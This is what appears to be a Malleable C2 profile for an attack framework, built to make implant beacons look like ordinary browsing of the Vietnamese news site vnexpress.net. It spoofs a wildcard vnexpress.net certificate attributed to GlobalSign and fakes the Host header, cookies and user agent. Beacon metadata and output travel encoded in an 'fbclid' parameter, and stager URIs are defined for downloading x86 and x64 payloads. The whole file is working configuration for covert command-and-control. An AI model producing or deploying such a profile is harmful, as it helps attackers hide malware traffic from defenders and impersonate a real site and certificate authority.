#
# VnExpress C2 Profile
#
# Author: @BR

https-certificate {
    set CN       "*.vnexpress.net";
    set O        "GlobalSign nv-sa";
    set C        "BE";
    set L        "Mountain View";
    set ST       "California";
    set validity "365";
}

set sample_name "vnexpress";
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-get {

    set uri "/lam-chi-dinh-xuat-vien-4503175.html";

    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "vnexpress.net";
        header "Upgrade-Insecure-Requests" "1";
        header "Sec-Fetch-Dest" "document";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Cookie" "device_env=4; sw_version=1; _efr=1661755020000; fosp_uid=dsvq5kuiqi4p8gjx.1661755096.des; fosp_aid=dsvq5kuiqi4p8gjx.1661755096.des; orig_aid=dsvq5kuiqi4p8gjx.1661755096.des; display_cpd=4";

        metadata {
            base64url;
            netbios;
            base64url;
            parameter "fbclid";
        }

    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "private, no-cache, max-age=60";
        header "Server" "GSE";
        header "Connection" "close";

        output {
            print;
        }
    }
}

http-post {

    set uri "/v2/viewersng/meta";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";
        header "Host" "vnexpress.net";
        header "Upgrade-Insecure-Requests" "1";
        header "Sec-Fetch-Dest" "document";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Cookie" "device_env=4; sw_version=1; _efr=1661755020000; fosp_uid=dsvq5kuiqi4p8gjx.1661755096.des; fosp_aid=dsvq5kuiqi4p8gjx.1661755096.des; orig_aid=dsvq5kuiqi4p8gjx.1661755096.des; display_cpd=4";

        output {
            base64url;
            netbios;
            base64url;
            parameter "fbclid";
        }

        id {
            parameter "u";
        }
    }

    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "private, no-cache, max-age=60";
        header "Server" "GSE";
        header "Connection" "close";

        output {
            print;
        }
    }
}

http-stager {
    set uri_x86 "/api/v2/GetProfilePicture";
    set uri_x64 "/api/v2/GetAttachment";
}
